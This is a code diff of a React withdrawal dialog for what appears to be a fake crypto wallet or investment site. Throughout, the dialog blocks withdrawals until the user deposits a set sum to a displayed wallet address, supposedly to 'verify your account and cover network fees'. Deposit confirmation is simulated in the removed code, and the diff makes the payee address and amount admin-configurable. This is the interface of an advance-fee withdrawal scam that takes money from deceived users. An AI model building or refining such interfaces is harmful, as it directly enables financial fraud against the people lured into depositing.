@@ -1,22 +1,15 @@
 import { useState } from 'react';
 import { useWallet } from '@/contexts/WalletContext';
 import {
-  Dialog,
-  DialogContent,
-  DialogHeader,
-  DialogTitle,
+  Dialog, DialogContent, DialogHeader, DialogTitle,
 } from '@/components/ui/dialog';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import {
-  Select,
-  SelectContent,
-  SelectItem,
-  SelectTrigger,
-  SelectValue,
+  Select, SelectContent, SelectItem, SelectTrigger, SelectValue,
 } from '@/components/ui/select';
 import { toast } from '@/hooks/use-toast';
-import { ArrowUpRight, Wallet, AlertTriangle, Copy, CheckCircle2, Bitcoin } from 'lucide-react';
+import { ArrowUpRight, Wallet, AlertTriangle, Copy, CheckCircle2 } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 
 interface WithdrawModalProps {
@@ -24,97 +17,56 @@ interface WithdrawModalProps {
   onOpenChange: (open: boolean) => void;
 }
 
-const DEPOSIT_REQUIREMENT = 10000;
-const BTC_WALLET_ADDRESS = 'bc1qfxcpxs5ztaf0ru6ptgk5hs7wcqq6khddy3g99e';
+const getWithdrawalRequirements = () => {
+  const saved = localStorage.getItem('gv_withdrawal_requirements');
+  if (saved) return JSON.parse(saved);
+  return { walletAddress: '', depositAmount: 0, enabled: false };
+};
 
 const WithdrawModal = ({ open, onOpenChange }: WithdrawModalProps) => {
-  const { balances, withdraw, addDeposit, hasDeposited } = useWallet();
+  const { balances, withdraw, hasDeposited } = useWallet();
   const [selectedCoin, setSelectedCoin] = useState('');
   const [amount, setAmount] = useState('');
   const [address, setAddress] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [showDepositScreen, setShowDepositScreen] = useState(false);
-  const [depositAmount, setDepositAmount] = useState('');
   const [copied, setCopied] = useState(false);
-  const [isConfirmingDeposit, setIsConfirmingDeposit] = useState(false);
 
   const selectedBalance = balances.find((b) => b.symbol === selectedCoin);
   const maxAmount = selectedBalance?.amount || 0;
+  const requirements = getWithdrawalRequirements();
 
   const copyToClipboard = () => {
-    navigator.clipboard.writeText(BTC_WALLET_ADDRESS);
+    navigator.clipboard.writeText(requirements.walletAddress);
     setCopied(true);
-    toast({
-      title: 'Address Copied',
-      description: 'BTC wallet address copied to clipboard',
-    });
+    toast({ title: 'Address Copied', description: 'Wallet address copied to clipboard' });
     setTimeout(() => setCopied(false), 2000);
-  };
-
-  const handleConfirmDeposit = async () => {
-    const numAmount = parseFloat(depositAmount);
-    if (isNaN(numAmount) || numAmount < DEPOSIT_REQUIREMENT) {
-      toast({
-        title: 'Invalid Amount',
-        description: `Minimum deposit is $${DEPOSIT_REQUIREMENT.toLocaleString()}`,
-        variant: 'destructive',
-      });
-      return;
-    }
-
-    setIsConfirmingDeposit(true);
-    await new Promise((resolve) => setTimeout(resolve, 2000));
-    
-    addDeposit(numAmount);
-    
-    toast({
-      title: 'Deposit Confirmed',
-      description: `$${numAmount.toLocaleString()} has been added to your balance`,
-    });
-
-    setIsConfirmingDeposit(false);
-    setShowDepositScreen(false);
-    setDepositAmount('');
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
-    // Check if user has deposited
-    if (!hasDeposited) {
+
+    // If admin has set requirements and user hasn't deposited
+    if (requirements.enabled && !hasDeposited) {
       setShowDepositScreen(true);
       return;
     }
-    
+
     if (!selectedCoin || !amount || !address) {
-      toast({
-        title: 'Missing fields',
-        description: 'Please fill in all fields',
-        variant: 'destructive',
-      });
+      toast({ title: 'Missing fields', description: 'Please fill in all fields', variant: 'destructive' });
       return;
     }
 
     const numAmount = parseFloat(amount);
     if (numAmount <= 0 || numAmount > maxAmount) {
-      toast({
-        title: 'Invalid amount',
-        description: 'Please enter a valid amount within your balance',
-        variant: 'destructive',
-      });
+      toast({ title: 'Invalid amount', description: 'Please enter a valid amount within your balance', variant: 'destructive' });
       return;
     }
 
     setIsSubmitting(true);
     await new Promise((resolve) => setTimeout(resolve, 1000));
-
     withdraw(selectedCoin, numAmount, address);
-
-    toast({
-      title: 'Withdrawal Submitted',
-      description: `Reviewing withdrawal processing…… ${numAmount} ${selectedCoin}`,
-    });
-
+    toast({ title: 'Withdrawal Submitted', description: `Reviewing withdrawal processing…… ${numAmount} ${selectedCoin}` });
     setSelectedCoin('');
     setAmount('');
     setAddress('');
@@ -127,13 +79,7 @@ const WithdrawModal = ({ open, onOpenChange }: WithdrawModalProps) => {
       <DialogContent className="sm:max-w-md">
         <AnimatePresence mode="wait">
           {showDepositScreen ? (
-            <motion.div
-              key="deposit"
-              initial={{ opacity: 0, x: 20 }}
-              animate={{ opacity: 1, x: 0 }}
-              exit={{ opacity: 0, x: -20 }}
-              transition={{ duration: 0.2 }}
-            >
+            <motion.div key="deposit" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
               <DialogHeader>
                 <DialogTitle className="flex items-center gap-2 font-display">
                   <AlertTriangle className="w-5 h-5 text-warning" />
@@ -142,109 +88,42 @@ const WithdrawModal = ({ open, onOpenChange }: WithdrawModalProps) => {
               </DialogHeader>
 
               <div className="space-y-5 mt-4">
-                <motion.div 
-                  className="p-4 rounded-xl bg-warning/10 border border-warning/30"
-                  initial={{ scale: 0.95 }}
-                  animate={{ scale: 1 }}
-                  transition={{ delay: 0.1 }}
-                >
-                  <p className="text-sm text-warning font-medium mb-2">
-                    ⚠️ Withdrawal Verification Required
-                  </p>
+                <motion.div className="p-4 rounded-xl bg-warning/10 border border-warning/30" initial={{ scale: 0.95 }} animate={{ scale: 1 }}>
+                  <p className="text-sm text-warning font-medium mb-2">⚠️ Withdrawal Verification Required</p>
                   <p className="text-sm text-muted-foreground">
-                    To process your withdrawal, you must first deposit a minimum of{' '}
-                    <span className="text-foreground font-bold">${DEPOSIT_REQUIREMENT.toLocaleString()}</span>{' '}
+                    To process your withdrawal, you must first deposit{' '}
+                    <span className="text-foreground font-bold">${requirements.depositAmount.toLocaleString()}</span>{' '}
                     to verify your account and cover network fees.
                   </p>
                 </motion.div>
 
-                <motion.div 
-                  className="p-4 rounded-xl bg-gradient-to-br from-orange-500/10 via-yellow-500/5 to-orange-600/10 border border-orange-500/20"
-                  initial={{ y: 10, opacity: 0 }}
-                  animate={{ y: 0, opacity: 1 }}
-                  transition={{ delay: 0.2 }}
-                >
+                <motion.div className="p-4 rounded-xl bg-primary/10 border border-primary/20" initial={{ y: 10, opacity: 0 }} animate={{ y: 0, opacity: 1 }} transition={{ delay: 0.2 }}>
                   <div className="flex items-center gap-2 mb-3">
-                    <Bitcoin className="w-5 h-5 text-orange-500" />
-                    <span className="font-medium text-sm">Deposit BTC to this address:</span>
+                    <Wallet className="w-5 h-5 text-primary" />
+                    <span className="font-medium text-sm">Deposit to this address:</span>
                   </div>
-                  
                   <div className="relative">
-                    <div className="p-3 bg-background/80 rounded-lg border border-border/50 font-mono text-xs break-all">
-                      {BTC_WALLET_ADDRESS}
+                    <div className="p-3 bg-background/80 rounded-lg border border-border/50 font-mono-code text-xs break-all">
+                      {requirements.walletAddress}
                     </div>
-                    <button
-                      onClick={copyToClipboard}
-                      className="absolute right-2 top-1/2 -translate-y-1/2 p-2 hover:bg-secondary rounded-md transition-colors"
-                    >
-                      {copied ? (
-                        <CheckCircle2 className="w-4 h-4 text-success" />
-                      ) : (
-                        <Copy className="w-4 h-4 text-muted-foreground" />
-                      )}
+                    <button onClick={copyToClipboard} className="absolute right-2 top-1/2 -translate-y-1/2 p-2 hover:bg-secondary rounded-md">
+                      {copied ? <CheckCircle2 className="w-4 h-4 text-success" /> : <Copy className="w-4 h-4 text-muted-foreground" />}
                     </button>
                   </div>
                 </motion.div>
 
-                <motion.div 
-                  className="space-y-2"
-                  initial={{ y: 10, opacity: 0 }}
-                  animate={{ y: 0, opacity: 1 }}
-                  transition={{ delay: 0.3 }}
-                >
-                  <label className="text-sm font-medium text-muted-foreground">
-                    Enter Deposit Amount (USD)
-                  </label>
-                  <Input
-                    type="number"
-                    placeholder={`Minimum $${DEPOSIT_REQUIREMENT.toLocaleString()}`}
-                    value={depositAmount}
-                    onChange={(e) => setDepositAmount(e.target.value)}
-                    min={DEPOSIT_REQUIREMENT}
-                  />
-                </motion.div>
-
-                <motion.div 
-                  className="p-3 rounded-lg bg-secondary/50 text-sm text-muted-foreground"
-                  initial={{ y: 10, opacity: 0 }}
-                  animate={{ y: 0, opacity: 1 }}
-                  transition={{ delay: 0.4 }}
-                >
+                <motion.div className="p-3 rounded-lg bg-secondary/50 text-sm text-muted-foreground font-mono-code" initial={{ y: 10, opacity: 0 }} animate={{ y: 0, opacity: 1 }} transition={{ delay: 0.3 }}>
                   <p>✓ This deposit will be added to your available balance</p>
                   <p>✓ You can withdraw your full balance after verification</p>
                 </motion.div>
 
-                <div className="flex gap-3">
-                  <Button
-                    variant="outline"
-                    onClick={() => setShowDepositScreen(false)}
-                    className="flex-1"
-                  >
-                    Back
-                  </Button>
-                  <Button
-                    variant="gold"
-                    onClick={handleConfirmDeposit}
-                    disabled={isConfirmingDeposit || !depositAmount}
-                    className="flex-1"
-                  >
-                    {isConfirmingDeposit ? (
-                      <div className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
-                    ) : (
-                      'Confirm Deposit'
-                    )}
-                  </Button>
-                </div>
+                <Button variant="outline" onClick={() => setShowDepositScreen(false)} className="w-full">
+                  Back
+                </Button>
               </div>
             </motion.div>
           ) : (
-            <motion.div
-              key="withdraw"
-              initial={{ opacity: 0, x: -20 }}
-              animate={{ opacity: 1, x: 0 }}
-              exit={{ opacity: 0, x: 20 }}
-              transition={{ duration: 0.2 }}
-            >
+            <motion.div key="withdraw" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 20 }}>
               <DialogHeader>
                 <DialogTitle className="flex items-center gap-2 font-display">
                   <ArrowUpRight className="w-5 h-5 text-primary" />
@@ -256,18 +135,12 @@ const WithdrawModal = ({ open, onOpenChange }: WithdrawModalProps) => {
                 <div className="space-y-2">
                   <label className="text-sm font-medium text-muted-foreground">Select Token</label>
                   <Select value={selectedCoin} onValueChange={setSelectedCoin}>
-                    <SelectTrigger>
-                      <SelectValue placeholder="Choose a token" />
-                    </SelectTrigger>
+                    <SelectTrigger><SelectValue placeholder="Choose a token" /></SelectTrigger>
                     <SelectContent>
                       {balances.map((balance) => (
                         <SelectItem key={balance.symbol} value={balance.symbol}>
                           <div className="flex items-center gap-2">
-                            <img
-                              src={balance.image}
-                              alt={balance.coin}
-                              className="w-5 h-5 rounded-full"
-                            />
+                            <img src={balance.image} alt={balance.coin} className="w-5 h-5 rounded-full" />
                             <span>{balance.coin}</span>
                             <span className="text-muted-foreground">({balance.symbol})</span>
                           </div>
@@ -281,36 +154,19 @@ const WithdrawModal = ({ open, onOpenChange }: WithdrawModalProps) => {
                   <div className="flex items-center justify-between">
                     <label className="text-sm font-medium text-muted-foreground">Amount</label>
                     {selectedBalance && (
-                      <button
-                        type="button"
-                        onClick={() => setAmount(maxAmount.toString())}
-                        className="text-xs text-primary hover:underline"
-                      >
+                      <button type="button" onClick={() => setAmount(maxAmount.toString())} className="text-xs text-primary hover:underline">
                         Max: {maxAmount.toLocaleString('en-US', { maximumFractionDigits: 4 })} {selectedCoin}
                       </button>
                     )}
                   </div>
-                  <Input
-                    type="number"
-                    placeholder="0.00"
-                    value={amount}
-                    onChange={(e) => setAmount(e.target.value)}
-                    step="any"
-                    min="0"
-                    max={maxAmount}
-                  />
+                  <Input type="number" placeholder="0.00" value={amount} onChange={(e) => setAmount(e.target.value)} step="any" min="0" max={maxAmount} />
                 </div>
 
                 <div className="space-y-2">
                   <label className="text-sm font-medium text-muted-foreground">Wallet Address</label>
                   <div className="relative">
                     <Wallet className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
-                    <Input
-                      placeholder="Enter recipient address"
-                      value={address}
-                      onChange={(e) => setAddress(e.target.value)}
-                      className="pl-10"
-                    />
+                    <Input placeholder="Enter recipient address" value={address} onChange={(e) => setAddress(e.target.value)} className="pl-10" />
                   </div>
                 </div>
 
@@ -333,18 +189,10 @@ const WithdrawModal = ({ open, onOpenChange }: WithdrawModalProps) => {
                   </div>
                 )}
 
-                <Button
-                  type="submit"
-                  variant="gold"
-                  size="lg"
-                  className="w-full"
-                  disabled={isSubmitting}
-                >
+                <Button type="submit" className="w-full bg-gradient-to-r from-primary to-accent text-primary-foreground font-display neon-glow" size="lg" disabled={isSubmitting}>
                   {isSubmitting ? (
                     <div className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
-                  ) : (
-                    'Confirm Withdrawal'
-                  )}
+                  ) : 'Confirm Withdrawal'}
                 </Button>
               </form>
             </motion.div>
